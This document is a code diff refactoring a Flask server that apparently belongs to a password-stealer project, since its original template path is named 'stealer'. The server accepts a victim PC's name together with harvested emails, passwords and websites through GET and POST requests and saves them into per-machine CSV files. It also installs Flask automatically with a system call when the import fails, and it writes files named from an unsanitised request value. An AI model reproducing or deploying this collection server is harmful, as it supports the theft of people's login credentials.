@@ -1,51 +1,41 @@
-import os
-import json
+from os import name as os_name
+from os import getcwd, listdir, system
 
-from flask import Flask, render_template, request, redirect
+try:
+    from flask import Flask, render_template, request
+except ImportError:
+    system("pip install flask")
+    from flask import Flask, render_template, request
 
 
-if os.name == 'posix':
-    SLASH = "/"
-    CLEAR = "clear"
-else:
-    SLASH = "\\"
-    CLEAR = "cls"
+if os_name == 'posix': SLASH = "/"
+else: SLASH = "\\"
 
 
 app = Flask(__name__, 
-            template_folder=os.getcwd()+SLASH+"stealer"+SLASH+"web"+SLASH+"templates"+SLASH, 
-            static_folder=os.getcwd()+SLASH+"stealer"+SLASH+"web"+SLASH+"static"+SLASH)
+            template_folder=getcwd()+SLASH+"web"+SLASH+"templates"+SLASH, 
+            static_folder=getcwd()+SLASH+"web"+SLASH+"static"+SLASH)
 
 
 @app.route("/")
 def index():
-    print(request.args.get("pcname"), request.args.get("key"))
     return render_template("index.html")
 
 
 @app.route("/password", methods=["GET", "POST"])
 def passwords():
-
     if request.method == 'GET':
-
         pcName = request.args.get("pcname")
         email = request.args.get("email")
         password = request.args.get("password")
         website = request.args.get("website")
 
-        if pcName is None:
-            pcName = "-"
-        
-        if email is None:
-            email = "-"
-        
-        if password is None:
-            password = "-"
-        
-        if website is None:
-            website = "-"
+        if pcName is None: pcName = "-"
+        if email is None: email = "-"
+        if password is None: password = "-"
+        if website is None: website = "-"
 
-        if not(f"{pcName}.csv" in os.listdir(f"{os.getcwd()}")):
+        if not(f"{pcName}.csv" in listdir(f"{getcwd()}")):
             with open(f"{pcName}.csv", "w", encoding="utf-8") as temp:
                 temp.write('''"website","email","password"''')
 
@@ -67,25 +57,17 @@ def passwords():
         return render_template("password.html")
     
     elif request.method == 'POST':
-
         pcName = request.values.get('pcname')
         email = request.values.get('email')
         password = request.values.get('password')
         website = request.values.get('website')
 
-        if pcName is None:
-            pcName = "-"
-        
-        if email is None:
-            email = "-"
-        
-        if password is None:
-            password = "-"
-        
-        if website is None:
-            website = "-"
+        if pcName is None: pcName = "-"
+        if email is None: email = "-"
+        if password is None: password = "-"
+        if website is None: website = "-"
 
-        if not(f"{pcName}.csv" in os.listdir(f"{os.getcwd()}")):
+        if not(f"{pcName}.csv" in listdir(f"{getcwd()}")):
             with open(f"{pcName}.csv", "w", encoding="utf-8") as temp:
                 temp.write('''"website","email","password"''')
 
